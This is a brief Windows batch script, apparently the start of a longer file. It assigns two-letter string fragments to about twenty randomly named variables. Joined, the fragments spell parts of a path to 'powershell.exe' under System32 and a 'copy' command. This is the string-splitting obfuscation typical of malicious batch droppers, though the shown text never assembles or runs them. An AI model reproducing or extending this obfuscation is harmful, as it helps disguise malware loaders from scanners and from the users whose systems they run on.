@echo off
set "dgQqnRGfVH=he"
set "BugVDARZdD=Wi"
set "JemIsSIXAy=Po"
set "bzumRAwkdb=in"
set "zDVflSrERF=:\"
set "OEXxKVUXGV=ll"
set "vqZbWxCyWD=do"
set "QZivmgqjwP=.e"
set "ANQWTnneUg=st"
set "MogbawWwYn=ow"
set "mvDMtUtjBs=\v"
set "TSqJASRnsl=0\"
set "pcUiKeYudg=y "
set "aRCkgeHvgU=py"
set "fCKyjLCvTx=po"
set "GCAJIisEZz=co"
set "ZqthKWrDNV=nd"
set "XUOpKxbSfX=we"
set "scksZpoleR=32"
